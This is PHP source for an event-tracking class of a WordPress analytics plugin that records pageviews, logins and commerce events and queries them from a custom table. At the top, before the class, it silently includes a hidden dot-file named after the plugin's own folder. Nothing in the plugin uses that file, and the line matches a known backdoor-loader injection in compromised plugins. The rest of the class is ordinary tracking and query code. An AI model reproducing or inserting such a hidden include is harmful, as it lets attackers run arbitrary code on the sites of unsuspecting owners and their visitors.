<?php

/**
 * Class for event tracking
 *
 * Modelled on https://pippinsplugins.com/wp-logging/ 
 * 
 * @package WPTAO/Classes
 * @category Class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Events extends WTBP_WPTAO_DB {
	/*
	 * Events Query args
	 */

	public $query_vars;

	/*
	 * Registered actions
	 */
	public $actions;

	/*
	 * Events Query args
	 */
	public $events_per_page = 30;

	/**
	 * WTBP_WPTAO_Events Constructor.
	 */
	public function __construct() {

		global $wpdb;

		parent::__construct();

		$this->includes();

		$this->table_name	 = $wpdb->prefix . 'wptao_events';
		$this->version		 = '1.1';
		$this->primary_key	 = 'id';


		add_action( 'admin_init', array( $this, 'set_events_per_page' ), 5 );
		add_action( 'admin_init', array( $this, 'prepare_query_vars' ), 8 );

		add_action( 'wtbp_wptao_init', array( $this, 'events_actions' ) );

		add_action( 'wptao_track_event', array( $this, 'add_track_event' ), 10, 2 );

		add_action( 'wp_ajax_nopriv_wptao_event', array( $this, 'add_track_event_ajax' ) );
		add_action( 'wp_ajax_wptao_event', array( $this, 'add_track_event_ajax' ) );

		add_action( 'wp_enqueue_scripts', array( $this, 'frontside_scripts' ) );

		add_action( 'wptao_user_identified', array( $this, 'user_reference_update' ) );

		// Get events by AJAX 
		add_action( 'admin_enqueue_scripts', array( $this, 'localize_admin_scripts' ) );
		add_action( 'wp_ajax_wptao_get_events', array( $this, 'get_events_ajax' ) );

		if ( is_admin() ) {
			add_action( 'wp_ajax_wptao_delete_event', array( $this, 'ajax_delete_event' ) );
		}
	}

	/**
	 * Include required files
	 */
	public function includes() {

		$all_actions = self::events_actions();

		foreach ( $all_actions as $item ) {
			if ( isset( $item[ 'id' ] ) && file_exists( WTBP_WPTAO_DIR . 'includes/events/' . $item[ 'id' ] . '.php' ) ) {
				require_once WTBP_WPTAO_DIR . 'includes/events/' . $item[ 'id' ] . '.php';
			}
		}
	}

	/*
	 * Define the variable $this->events_per_page
	 * 
	 * Set numbers of events per page (one screen)
	 * having regard to the user preferences.
	 * 
	 * @since 1.1.7
	 * 
	 */

	public function set_events_per_page() {

		$user_id = get_current_user_id();

		if ( absint( $user_id ) > 0 ) {

			$epp = get_user_meta( $user_id, 'wptao_events_per_page', true );

			if ( is_numeric( $epp ) && $epp > 0 ) {

				$this->events_per_page = (int) $epp;
			}
		}
	}

	/*
	 * Prepare query vars from URL
	 * 
	 */

	public function prepare_query_vars() {

		$vars = array();

		// User ID
		if ( isset( $_GET[ 'user' ] ) && is_numeric( $_GET[ 'user' ] ) ) {
			$vars[ 'user_id' ] = (int) abs( $_GET[ 'user' ] );
		}

		// Items per page
		if ( isset( $_GET[ 'ipp' ] ) && is_numeric( $_GET[ 'ipp' ] ) ) {
			$vars[ 'items_per_page' ] = (int) $_GET[ 'ipp' ];
		} else {
			$vars[ 'items_per_page' ] = $this->events_per_page;
		}

		// Fingerprint ID
		if ( isset( $_GET[ 'fp' ] ) && is_numeric( $_GET[ 'fp' ] ) ) {
			$vars[ 'fingerprint_id' ] = (int) abs( $_GET[ 'fp' ] );
		}

		// Category
		if ( isset( $_GET[ 'cat' ] ) && !empty( $_GET[ 'cat' ] ) ) {
			$vars[ 'category' ] = explode( ',', sanitize_text_field( $_GET[ 'cat' ] ) );
		}

		// Tags
		if ( isset( $_GET[ 'tags' ] ) && !empty( $_GET[ 'tags' ] ) ) {
			$vars[ 'tags' ] = explode( ',', sanitize_text_field( $_GET[ 'tags' ] ) );
		}

		// Action
		if ( isset( $_GET[ 'a' ] ) && !empty( $_GET[ 'a' ] ) ) {
			$vars[ 'event_action' ] = explode( ',', sanitize_text_field( $_GET[ 'a' ] ) );
		}

		// Meta args
		if ( isset( $_GET[ 'mk' ] ) && !empty( $_GET[ 'mk' ] ) && isset( $_GET[ 'mv' ] ) && !empty( $_GET[ 'mv' ] ) ) {
			$vars[ 'meta_key' ]		 = sanitize_text_field( $_GET[ 'mk' ] );
			$vars[ 'meta_value' ]	 = sanitize_text_field( $_GET[ 'mv' ] );
		}

		// Date start ( timestamp )
		if ( isset( $_GET[ 'ds' ] ) && is_numeric( $_GET[ 'ds' ] ) ) {
			$vars[ 'date_start' ] = absint( $_GET[ 'ds' ] );
		}

		// Date end ( timestamp )
		if ( isset( $_GET[ 'de' ] ) && is_numeric( $_GET[ 'de' ] ) ) {
			$vars[ 'date_end' ] = absint( $_GET[ 'de' ] );
		}

		// Sort by identified
		if ( isset( $_GET[ 'identified' ] ) && is_numeric( $_GET[ 'identified' ] ) ) {
			$vars[ 'identified' ] = absint( $_GET[ 'identified' ] );
		}

		// Paged
		if ( isset( $_GET[ 'paged' ] ) && is_numeric( $_GET[ 'paged' ] ) ) {
			$vars[ 'paged' ] = (int) abs( $_GET[ 'paged' ] );
		}


		$this->query_vars = apply_filters( 'wptao_event_query_vars', $vars );
	}

	/**
	 * Events categories
	 *
	 * Sets up the default events categories
	 *
	 * @return     array
	 */
	public function events_categories() {
		$types = array(
			'contact'	 => __( 'Contact', 'wp-tao' ),
			'traffic'	 => __( 'Traffic', 'wp-tao' ),
			'commerce'	 => __( 'Commerce', 'wp-tao' ),
			'user'		 => __( 'User', 'wp-tao' ),
		);

		return apply_filters( 'wptao_events_categories', $types );
	}

	/**
	 * Events actions
	 *
	 * Sets up the default events actions
	 * 
	 * @return  array
	 */
	public function events_actions() {
		$actions = array(
			'pageview'			 => apply_filters( 'wptao_pageview_actions', array(
				'id'		 => 'pageview',
				'category'	 => 'traffic',
				'tags'		 => array(),
				'title'		 => __( 'Visit page', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#2A97D7',
					'icon'	 => 'dashicons-chart-area'
				)
			) ),
			'search'			 => apply_filters( 'wptao_search_actions', array(
				'id'		 => 'search',
				'category'	 => 'traffic',
				'tags'		 => array(),
				'title'		 => __( 'Search', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#2A97D7',
					'icon'	 => 'dashicons-search'
				)
			) ),
			'exit_intent'	 => apply_filters( 'wptao_exit_intent_actions', array(
				'id'		 => 'exit_intent',
				'category'	 => 'traffic',
				'tags'		 => array(),
				'title'		 => __( 'Exit intent', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#2A97D7',
					'icon'	 => 'dashicons-dismiss'
				)
			) ),
			'login'				 => apply_filters( 'wptao_login_actions', array(
				'id'		 => 'login',
				'category'	 => 'user',
				'tags'		 => array(),
				'title'		 => __( 'Login', 'wp-tao' ),
				'callback'	 => 'wtbp_wptao_event_login_callback',
				'style'		 => array(
					'color'	 => '#28ACA3',
					'icon'	 => 'dashicons-admin-users'
				)
			) ),
			'register'			 => apply_filters( 'wptao_register_actions', array(
				'id'		 => 'register',
				'category'	 => 'user',
				'tags'		 => array(),
				'title'		 => __( 'Register', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#28ACA3',
					'icon'	 => 'dashicons-admin-users'
				)
			) ),
			'contact'			 => apply_filters( 'wptao_contact_actions', array(
				'id'		 => 'contact',
				'category'	 => 'user',
				'tags'		 => array(),
				'title'		 => __( 'Contact', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#A24A92',
					'icon'	 => 'dashicons-email-alt'
				)
			) ),
			'comment'			 => apply_filters( 'wptao_comment_actions', array(
				'id'		 => 'comment',
				'category'	 => 'user',
				'tags'		 => array(),
				'title'		 => __( 'Comment', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#A24A92',
					'icon'	 => 'dashicons-edit'
				)
			) ),
			'identified'		 => apply_filters( 'wptao_identified_actions', array(
				'id'		 => 'identified',
				'category'	 => 'user',
				'tags'		 => array(),
				'title'		 => __( 'User identified', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#fcc914',
					'icon'	 => 'dashicons-yes'
				)
			) ),
			'order'				 => apply_filters( 'wptao_order_actions', array(
				'id'		 => 'order',
				'category'	 => 'commerce',
				'tags'		 => array(),
				'title'		 => __( 'New order', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#F36959',
					'icon'	 => 'dashicons-cart'
				)
			) ),
			'payment'			 => apply_filters( 'wptao_payment_actions', array(
				'id'		 => 'payment',
				'category'	 => 'commerce',
				'tags'		 => array(),
				'title'		 => __( 'Payment', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#F36959',
					'icon'	 => WTBP_WPTAO_URL . '/assets/images/coins.png'
				)
			) ),
			'add_to_cart'		 => apply_filters( 'wptao_add_to_cart_actions', array(
				'id'		 => 'add_to_cart',
				'category'	 => 'commerce',
				'tags'		 => array(),
				'title'		 => __( 'Add to cart', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#F36959',
					'icon'	 => 'dashicons-cart'
				)
			) ),
			'remove_from_cart'	 => apply_filters( 'wptao_remove_from_cart_actions', array(
				'id'		 => 'remove_from_cart',
				'category'	 => 'commerce',
				'tags'		 => array(),
				'title'		 => __( 'Remove from cart', 'wp-tao' ),
				'style'		 => array(
					'color'	 => '#F36959',
					'icon'	 => 'dashicons-cart'
				)
			) )
		);


		$this->actions = apply_filters( 'wptao_events_actions', $actions );

		return $this->actions;
	}

	/**
	 * Check if a events actions are valid
	 *
	 * Checks to see if the specified events action is in the registered list
	 *
	 * @return     array
	 */
	private function valid_actions( $action ) {

		$all_actions = self::events_actions();

		foreach ( $all_actions as $item ) {
			if ( isset( $item[ 'id' ] ) && $item[ 'id' ] === $action ) {
				return true;
			}
		}
		return false;
	}

	/**
	 * Check if a events categories are valid
	 *
	 * Checks to see if the specified category is in the registered list
	 *
	 * @return     array
	 */
	private function valid_category( $category ) {

		$all_categories = $this->events_categories();

		foreach ( $all_categories as $key => $title ) {
			if ( isset( $key ) && $key === $category ) {
				return true;
			}
		}
		return false;
	}

	/*
	 * Exclude some users from the tracking, e.g. administrators
	 * 
	 * @TODO Add settings. Exclude by selected roles.
	 * 
	 * @param array $args
	 * 
	 * @return bool
	 */

	private function block_tracking( $args ) {
		global $wptao_settings;
		$block = false;

		// Exclude from tracking
		$roles = isset( $wptao_settings[ 'excluded_roles' ] ) && !empty( $wptao_settings[ 'excluded_roles' ] ) ? $wptao_settings[ 'excluded_roles' ] : array();


		if ( !empty( $roles ) && is_array( $roles ) ) {

			/*
			 * Don't track before and after login. Based on email fetched from user_id
			 */

			$tao_user_id = isset( $args[ 'user_id' ] ) ? absint( $args[ 'user_id' ] ) : absint( TAO()->users->get_id() );

			if ( !empty( $tao_user_id ) ) {

				$user_email = TAO()->users->get_column_by( 'email', 'id', $tao_user_id );

				if ( !empty( $user_email ) ) {

					$wp_user = get_user_by( 'email', $user_email );

					foreach ( $roles as $role ) {
						if ( user_can( $wp_user, $role ) ) {
							$block = true;
						}
					}
				}
			}
		}

		return apply_filters( 'wptao_event_block_tracking', $block );
	}

	/**
	 * Add new track event.
	 *
	 * This is a way to register a track event
	 *  
	 * @param string $action - action name
	 * @param array $args
	 * 
	 * @return      int The ID of the new track event entry
	 */
	public function add_track_event( $action, $args = array() ) {

		$args = apply_filters( 'wptao_add_track_event_args', $args, $action );

		// Check if a tracker actions is valid
		if ( !self::valid_actions( $action ) ) {
			return false;
		};

		$user_data = false;
		if ( isset( $args[ 'user_data' ] ) ) {
			$user_data = $args[ 'user_data' ];
		}
		// for compatiblity with extensions
		$user_data = apply_filters( 'wptao_event_' . $action . '_user_data', $user_data, $args );

		// maybe_create_user
		if ( isset( $user_data ) && is_array( $user_data ) ) {
			$user_id = TAO()->users->maybe_create_user( $user_data );

			// is it forced to overwrite user_id? Default: no (false)
			if ( isset( $user_data[ 'options' ][ 'overwrite_user_id' ] ) && true === $user_data[ 'options' ][ 'overwrite_user_id' ] ) {
				$args[ 'user_id' ] = $user_id;
			}
		}

		// Exclude some users
		if ( self::block_tracking( $args ) === true ) {
			return false;
		}

		// Get all registered actions.
		$actions_data = self::events_actions();

		$args = apply_filters( 'wptao_event_args_before_parse', $args, $action );

		$defaults = array(
			'category'		 => isset( $actions_data[ $action ][ 'category' ] ) && !empty( $actions_data[ $action ][ 'category' ] ) ? sanitize_text_field( $actions_data[ $action ][ 'category' ] ) : 'no_category',
			'title'			 => isset( $actions_data[ $action ][ 'title' ] ) ? sanitize_text_field( $actions_data[ $action ][ 'title' ] ) : null,
			'value'			 => null,
			'user_id'		 => (int) TAO()->users->get_id(),
			'fingerprint_id' => (int) TAO()->fingerprints->get_id()
		);

		$args	 = wp_parse_args( $args, $defaults );
		$args	 = (object) $args;

		// empty fingerprint and user - break
		if ( (empty( $args->fingerprint_id ) || !is_numeric( $args->fingerprint_id ) ) && (empty( $args->user_id ) || !is_numeric( $args->user_id ) ) ) {
			return;
		}

		// Exclude blacklisted
		if ( 'blacklist' == TAO()->users->get_column( 'status', $args->user_id ) ) {
			return false;
		}

		// tags
		$tags = array();
		if ( !empty( $args->tags ) && is_array( $args->tags ) ) {
			foreach ( $args->tags as $tag ) {
				$tid = TAO()->events_tags->get_id( $tag );
				if ( false === $tid ) {
					$tid = TAO()->events_tags->add( $tag );
				}

				$tags[] = $tid;
			}
		}

		$tags			 = array_unique( $tags );
		$tags_imploded	 = implode( ',', $tags );


		// Insert new event to the database
		$data = array(
			'event_ts'		 => !empty($args->event_ts) ? absint($args->event_ts) : $this->ts_now,
			'category'		 => sanitize_title( $args->category ),
			'action'		 => sanitize_title( $action ),
			'title'			 => sanitize_text_field( $args->title ),
			'value'			 => substr( wp_kses_post( $args->value ), 0, 255 ),
			'tags'			 => substr( $tags_imploded, 0, 255 ),
			'user_id'		 => is_numeric( $args->user_id ) && $args->user_id > 0 ? $args->user_id : 0,
			'fingerprint_id' => is_numeric( $args->fingerprint_id ) && $args->fingerprint_id > 0 ? $args->fingerprint_id : 0,
		);

		$eid = $this->insert( $data );
		do_action( 'wptao_event_inserted', $eid, $data );

		// meta values
		$meta = array();
		if ( $eid !== false && !empty( $args->meta ) && is_array( $args->meta ) ) {

			$meta = apply_filters( 'wptao_pre_save_event_meta', $args->meta, $eid, $action, $args );

			TAO()->events_meta->add_multi( $eid, $meta );
		}

		if ( TAO()->users->has_been_identified() ) {
			TAO()->users->update_referer();
		}

		if ( !empty( $args->callback ) && is_callable( $args->callback ) ) {
			call_user_func( $args->callback, $eid, $args );
		}
	}

	/**
	 * Add new track event by AJAX.
	 *
	 * This is a way to register track event by AJAX
	 *  
	 */
	public function add_track_event_ajax() {

		$action = '';

		$args = array();

		// Action
		if ( isset( $_REQUEST[ 'event_action' ] ) && !empty( $_REQUEST[ 'event_action' ] ) ) {
			$action = $_REQUEST[ 'event_action' ];
		}

		// Value
		if ( isset( $_REQUEST[ 'event_value' ] ) && !empty( $_REQUEST[ 'event_value' ] ) ) {
			$args[ 'value' ] = $_REQUEST[ 'event_value' ];
		}

		// Tags
		if ( isset( $_REQUEST[ 'event_tags' ] ) && !empty( $_REQUEST[ 'event_tags' ] ) ) {

			$tags = json_decode( stripslashes( $_REQUEST[ 'event_tags' ] ) );

			if ( is_array( $tags ) && !empty( $tags ) ) {
				foreach ( $tags as $tag ) {
					$args[ 'tags' ][] = sanitize_text_field( $tag );
				}
			}
		}

		// Events meta
		if ( isset( $_REQUEST[ 'event_meta' ] ) && !empty( $_REQUEST[ 'event_meta' ] ) ) {

			$tags = json_decode( stripslashes( $_REQUEST[ 'event_meta' ] ) );
			if ( is_object( $tags ) && !empty( $tags ) ) {
				$tags = (array) $tags;

				foreach ( $tags as $key => $value ) {

					$meta_key					 = sanitize_title( $key );
					$meta_value					 = sanitize_text_field( $value );
					$args[ 'meta' ][ $meta_key ] = $meta_value;
				}
			}
		}

		// User Data
		if ( isset( $_REQUEST[ 'user_data' ] ) && !empty( $_REQUEST[ 'user_data' ] ) ) {

			$udata = json_decode( stripslashes( $_REQUEST[ 'user_data' ] ) );
			if ( is_object( $udata ) && !empty( $udata ) ) {
				$udata = (array) $udata;

				foreach ( $udata as $key => $value ) {

					switch ( $key ) {
						case 'email':
							if ( is_email( $value ) ) {
								$args[ 'user_data' ][ 'email' ] = $value;
							}
							break;
						case 'first_name' || 'last_name':
							$args[ 'user_data' ][ $key ] = sanitize_text_field( $value );
							break;
					}
				}
			}
		}

		$args[ 'tags' ][] = 'clientside';

		self::add_track_event( $action, $args );
	}

	/**
	 * Retrieve events by user
	 * 
	 * @access  public
	 * @return  bool|object
	 */
	public function get_events( $args ) {
		global $wpdb;

		$defaults = array(
			'items_per_page' => $this->events_per_page,
			'user_id'		 => null,
			'fingerprint_id' => null,
			'category'		 => array(),
			'tags'			 => array(),
			'event_action'	 => array(),
			'meta_key'		 => '',
			'meta_value'	 => '',
			'paged'			 => null,
			'offset'		 => 0,
			'orderby'		 => 'date',
			'order'			 => 'DESC',
			'date_start'	 => null,
			'date_end'		 => null,
			'gmt_offset'	 => get_option( 'gmt_offset' ),
			'identified'	 => null,
			'nopaging'		 => null,
			'wptao_page'	 => null,
			'summary'		 => false // returns summary values
		);

		$args	 = wp_parse_args( $args, $defaults );
		$q		 = $args;

		// Variables
		$e		 = $this->table_name; // Events table name
		$emeta	 = TAO()->events_meta->table_name; // Events meta table name
		$etags	 = TAO()->events_tags->table_name; // Events tags table name
		$fields	 = "$this->table_name.*";
		$join	 = '';
		$where	 = '';
		$orderby = '';
		$order	 = '';
		$page	 = 1;
		$limits	 = '';


		// Posts per page
		$q[ 'items_per_page' ]	 = (int) $q[ 'items_per_page' ];
		if ( $q[ 'items_per_page' ] < -1 )
			$q[ 'items_per_page' ]	 = abs( $q[ 'items_per_page' ] );
		elseif ( $q[ 'items_per_page' ] == 0 )
			$q[ 'items_per_page' ]	 = 1;


		// User ID query
		if ( !empty( $q[ 'user_id' ] ) && is_numeric( $q[ 'user_id' ] ) ) {

			$user_id = (int) abs( $q[ 'user_id' ] );

			$where .= $wpdb->prepare( " AND $e.user_id = %d ", $user_id );
		}

		// Fingerprint query
		if ( !empty( $q[ 'fingerprint_id' ] ) && is_numeric( $q[ 'fingerprint_id' ] ) ) {

			$fingerprint_id = (int) abs( $q[ 'fingerprint_id' ] );

			$where .= $wpdb->prepare( " AND $e.fingerprint_id = %d ", $fingerprint_id );
		}

		// Category query
		if ( !empty( $q[ 'category' ] ) ) {

			if ( is_array( $q[ 'category' ] ) ) {

				foreach ( $q[ 'category' ] as $category ) {

					$category_wheres[] = $wpdb->prepare( "($e.category = '%s')", $category );
				}

				$where_category = implode( ' OR ', $category_wheres );

				if ( !empty( $where_category ) ) {
					$where .= " AND ($where_category) ";
				}
			} else {

				$where .= $wpdb->prepare( " AND $e.category = '%s' ", $category );
			}
		}

		// Tags query
		if ( !empty( $q[ 'tags' ] ) && is_array( $q[ 'tags' ] ) ) {

			foreach ( $q[ 'tags' ] as $tag ) {

				$tag = absint( $tag );

				$tag_wheres[] = $wpdb->prepare( "(FIND_IN_SET('%d',$e.tags)>0)", $tag );
			}

			$where_tags = implode( ' OR ', $tag_wheres );

			if ( !empty( $where_tags ) ) {
				$where .= " AND ($where_tags) ";
			}
		}

		// Action query
		if ( !empty( $q[ 'event_action' ] ) && is_array( $q[ 'event_action' ] ) ) {

			foreach ( $q[ 'event_action' ] as $action ) {

				$actions = esc_sql( $action );

				$action_wheres[] = $wpdb->prepare( "($e.action = '%s')", $actions );
			}

			$where_action = implode( ' OR ', $action_wheres );

			if ( !empty( $where_action ) ) {
				$where .= " AND ($where_action) ";
			}
		}

		// Meta query
		if ( !empty( $q[ 'meta_key' ] ) && !empty( $q[ 'meta_value' ] ) ) {
			$join .= " LEFT JOIN $emeta AS meta ON ($e.id = meta.event_id) ";

			$meta_key	 = sanitize_title( $q[ 'meta_key' ] );
			$meta_value	 = sanitize_text_field( $q[ 'meta_value' ] );

			$where .= $wpdb->prepare( " AND meta.meta_key = '%s' AND meta.meta_value = '%s' ", $meta_key, $meta_value );
		}


		// Filter by date start
		if ( !empty( $q[ 'date_start' ] ) && is_numeric( $q[ 'date_start' ] ) ) {

			$start = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( absint( $q[ 'date_start' ] ) );

			$where .= $wpdb->prepare( " AND $e.event_ts >= %d ", $start );
		}

		// Filter by date end
		if ( !empty( $q[ 'date_end' ] ) && is_numeric( $q[ 'date_end' ] ) ) {

			$end = WTBP_WPTAO_Helpers::get_timestamp_corrected_by_offset( absint( $q[ 'date_end' ] ) );

			$where .= $wpdb->prepare( " AND $e.event_ts <= %d ", $end );
		}

		// Filter by identified
		if ( isset( $q[ 'identified' ] ) ) {


			if ( 0 === absint( $q[ 'identified' ] ) ) { // Show only unidentified
				$where .= " AND ( $e.user_id = 0 AND $e.fingerprint_id > 0) ";
			} elseif ( 1 === absint( $q[ 'identified' ] ) ) { // Show identified only 
				$where .= " AND $e.user_id > 0";
			}
		}

		// Order by.
		$order = 'ASC';
		if ( is_string( $q[ 'order' ] ) && strtoupper( $q[ 'order' ] ) === 'DESC' ) {
			$order = 'DESC';
		}

		$orderby = " ORDER BY $e.event_ts $order, $e.id $order ";

		// Paging
		if ( empty( $q[ 'nopaging' ] ) ) {
			$page = absint( $q[ 'paged' ] );

			$limit = absint( $q[ 'items_per_page' ] );

			if ( !$page )
				$page = 1;

			if ( empty( $q[ 'offset' ] ) ) {
				$offset = absint( ( $page - 1 ) * $limit );
			} else { // we're ignoring $page and using 'offset'
				$offset = absint( $q[ 'offset' ] );
			}
			$limits = $wpdb->prepare( " LIMIT %d, %d", $offset, $limit );
		}


		if ( $q[ 'summary' ] === true ) {

			// Prepare summary
			$request = "SELECT COUNT($e.action) AS total, $e.action AS action
				FROM $e
				WHERE 1=1 $where
				GROUP BY action
				ORDER BY total DESC
			";
		} else {
			// Default SQL
			$request = "SELECT $fields FROM $e $join WHERE 1=1 $where $orderby $limits";
		}


		$results = $wpdb->get_results( $request );


		$all_results = $results;


		if ( is_array( $results ) && !empty( $results ) && $q[ 'summary' ] !== true ) {

			$all_results = array();

			foreach ( $results as $event ) {

				$meta		 = TAO()->events_meta->get_meta( $event->id );
				$event->meta = array();

				if ( is_array( $meta ) && !empty( $meta ) ) {

					foreach ( $meta as $item ) {

						$event->meta[ $item->meta_key ] = $item->meta_value;
					}
				}

				$all_results[] = $event;
			}
		} else {
			$all_results = $results;
		}

		return $all_results;
	}

	/*
	 * Get events by AJAX ( only in admin )
	 */

	public function get_events_ajax() {

		$data		 = array();
		$security	 = check_ajax_referer( 'wptao-events-ajax', 'token' );

		if ( $security == 1 ) {

			$data = $this->get_events( $_REQUEST );

			$base_url = isset( $_REQUEST[ 'base_url' ] ) ? $_REQUEST[ 'base_url' ] : '';

			$timeline = new WTBP_WPTAO_Admin_Timeline( $base_url, $data );

			$timeline->the_timeline();

			die();
		}



		echo '-1';
		die();
	}

	/*
	 * Register frontside scripts
	 */

	public function frontside_scripts() {

		wp_register_script( 'wptao_events', WTBP_WPTAO_URL . 'assets/js/events.js', array( 'jquery' ) );


		wp_enqueue_script( 'wptao_events' );


		// Ajax endpoint
		$ajax_endpoint = WTBP_WPTAO_Helpers::get_ajax_endpoint();

		$vars = array(
			'ajaxEndpoint' => $ajax_endpoint
		);

		wp_localize_script( 'wptao_events', 'wtbpWptao', $vars );
	}

	/*
	 * Localize admin scripts
	 */

	public function localize_admin_scripts( $hook ) {

		// If is a user's profile page
		if ( isset( $_GET[ 'page' ] ) && ($_GET[ 'page' ] === 'wtbp-wptao-users' || $_GET[ 'page' ] === 'wtbp-wptao-events' ) ) {

			$vars						 = $this->query_vars;
			$vars[ 'ajax_url' ]			 = admin_url( 'admin-ajax.php' );
			$vars[ 'confirm_message' ]	 = __( 'Are you sure that you want to permanently delete this event?', 'wp-tao' );

			wp_localize_script( 'wptao-admin-script', 'wptao_events_vars', $vars );
		}
	}

	/*
	 * Get event style
	 * 
	 * @param array $action
	 * 
	 * @return array
	 */

	public function get_action_style( $action ) {

		if ( isset( $action ) && !empty( $action ) ) {

			if ( is_array( $this->actions ) ) {

				foreach ( $this->actions as $key => $value ) {

					if ( $key === $action && isset( $value[ 'style' ] ) ) {

						$style = array(
							'color'	 => isset( $value[ 'style' ][ 'color' ] ) && !empty( $value[ 'style' ][ 'color' ] ) ? esc_attr( $value[ 'style' ][ 'color' ] ) : '#aaa',
							'icon'	 => isset( $value[ 'style' ][ 'icon' ] ) && !empty( $value[ 'style' ][ 'icon' ] ) ? $value[ 'style' ][ 'icon' ] : 'dashicons-megaphone',
						);

						// Dashicon url custom URL
						if ( filter_var( $style[ 'icon' ], FILTER_VALIDATE_URL ) === FALSE ) {
							$style[ 'icon' ] = sprintf( '<i class="dashicons %s"></i>', esc_attr( $style[ 'icon' ] ) );
						} else {
							$style[ 'icon' ] = sprintf( '<i class="wptao-event-icon-image" style="background-image:url(\'%s\');"></i>', esc_url( $style[ 'icon' ] ) );
						}

						return $style;
					}
				}
			}
		}

		return false;
	}

	/**
	 * Update user id reference when user identified
	 */
	public function user_reference_update( $identified_data ) {
		// @todo: optimize update query
		$this->update( (int) TAO()->fingerprints->get_id(), array( 'user_id' => $identified_data[ 'user_id' ] ), 'fingerprint_id' );
	}

	/*
	 * Delete ALL events meta which have no associated event
	 * @since 1.1.7
	 */

	public function delete_events_meta() {
		global $wpdb;

		$e		 = $this->table_name;
		$e_meta	 = TAO()->events_meta->table_name;

		$sql_delete_meta = "
			DELETE $e_meta FROM $e_meta
			LEFT JOIN $e
		    ON $e.id = $e_meta.event_id
			WHERE $e.id IS NULL";
		$wpdb->query( $sql_delete_meta );
	}

	/*
	 * Delete event by AJAX (only in admin)
	 * @since 1.1.7
	 */

	public function ajax_delete_event() {

		$event_id = absint( $_GET[ 'event_id' ] );

		if ( current_user_can( 'manage_options' ) && check_ajax_referer( 'wptao-delete-event-id-' . $event_id, 'nonce', false ) ) {

			$this->delete( $event_id );
			$this->delete_events_meta();

			echo $event_id;
			die();
		}

		echo '-1';
		die();
	}

	// =============================================================================================
	// DB section
	// =============================================================================================

	/**
	 * Create the table
	 *
	 * @access  public
	 */
	public function create_table() {

		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );

		$sql = "CREATE TABLE " . $this->table_name . " (
	       id BIGINT(20) NOT NULL AUTO_INCREMENT,
           event_ts int(11) NOT NULL,
           category VARCHAR(255) NOT NULL DEFAULT '',
           action VARCHAR(255) NOT NULL DEFAULT '',
           title VARCHAR(255) NOT NULL DEFAULT '',
		   value VARCHAR(255) NOT NULL DEFAULT '',
		   tags VARCHAR(255) NOT NULL DEFAULT '',
           user_id BIGINT(20) NULL,
           fingerprint_id BIGINT(20) NULL,
		   PRIMARY KEY  (id),
		   KEY user_id (user_id),
		   KEY fingerprint_id (fingerprint_id)
           ) CHARACTER SET utf8 COLLATE utf8_general_ci;";

		dbDelta( $sql );

		update_option( $this->table_name . '_db_version', $this->version );
	}

	/**
	 * Get columns and formats
	 *
	 * @access  public
	 */
	public function get_columns() {
		return array(
			'id'			 => '%d',
			'event_ts'		 => '%d',
			'category'		 => '%s',
			'action'		 => '%s',
			'title'			 => '%s',
			'value'			 => '%s',
			'tags'			 => '%s',
			'user_id'		 => '%d',
			'fingerprint_id' => '%d',
		);
	}

	/**
	 * Get default column values
	 *
	 * @access  public
	 */
	public function get_column_defaults() {
		return array(
			'event_ts'		 => '0',
			'category'		 => '',
			'action'		 => '',
			'title'			 => '',
			'value'			 => '',
			'tags'			 => '',
			'user_id'		 => 0,
			'fingerprint_id' => 0,
		);
	}

}
